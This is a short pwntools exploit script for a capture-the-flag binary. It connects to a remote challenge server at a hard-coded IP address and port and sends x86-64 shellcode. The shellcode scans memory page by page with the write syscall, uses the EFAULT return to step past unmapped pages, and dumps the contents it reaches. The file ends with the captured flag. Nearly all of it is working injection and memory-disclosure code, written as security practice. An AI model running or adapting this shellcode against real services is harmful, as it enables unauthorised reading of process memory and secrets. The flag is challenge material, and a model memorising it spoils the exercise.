import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']
context.arch = 'amd64'

PROG = './ihnsaims'
elf = ELF(PROG)

### ------------------ EXPLOIT ------------------ ###

# r = process([PROG, 'fake_flag'])
r = remote('54.85.45.101', 8002)

# If write() is given a pointer that can't be dereferenced, it returns an EFAULT (-14)
# and not SEGFAULT which would kill the process. Keep reading page after page (size 0x1000)
# until we don't segfault. Print the whole page.

pay = asm(f"""
    push 0
    mov rsi, 0x4200000

loop_start:
    mov rdi, 1
    mov rdx, 0x1000
    mov rax, SYS_write
    syscall

    cmp rax, -14
    jne exit_loop

    add rsi, 0x1000
    jmp loop_start

exit_loop:
    mov rdi, 1

""")


r.sendline(b'1')
r.sendline(pay)

r.interactive()

# flag{the_moral_of_the_story_is_dont_be_mean_to_chatgpt}